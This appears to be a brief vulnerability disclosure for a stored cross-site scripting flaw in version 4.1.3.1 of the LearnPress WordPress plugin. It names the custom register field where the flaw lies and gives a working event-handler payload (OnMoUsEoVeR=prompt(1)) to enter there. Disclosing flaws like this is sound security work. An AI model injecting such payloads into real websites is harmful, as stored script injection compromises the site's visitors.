# Exploit Title: LearnPress – WordPress LMS Plugin—— Stored Cross-Site Scripting
# Exploit Author: Thinkland Security Team
# Vendor Homepage: https://wordpress.org/plugins/learnpress/
# Version :  V 4.1.3.1
# Vulnerability Type: Stored Cross-Site Scripting
# Tested on Windows 10 、XAMPP
# Vulnerability proof：  
1. Settings》Profile》Custom register fields》Name,insert the xss payload "OnMoUsEoVeR=prompt(1)//
![image](https://github.com/BigTiger2020/word-press/blob/main/LearnPress.gif)  
